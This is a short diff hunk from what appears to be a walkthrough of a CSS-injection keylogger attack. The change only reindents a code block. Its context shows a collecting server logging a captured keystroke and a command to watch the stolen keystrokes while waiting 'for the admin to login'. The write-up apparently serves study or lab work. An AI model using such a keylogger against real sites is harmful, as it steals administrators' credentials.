@@ -52,6 +52,6 @@ is a wrapper injection string around the content of `keylogger.css`.
     172.22.208.1 - - [17/Nov/2024 02:47:53] "GET /?key=u HTTP/1.1" 200 -
     ```
 - All keystrokes will be saved to `keystrokes.txt`. Now wait for the admin to login... 
-```
-watch cat keystrokes.txt
-```
+    ```
+    watch cat keystrokes.txt
+    ```
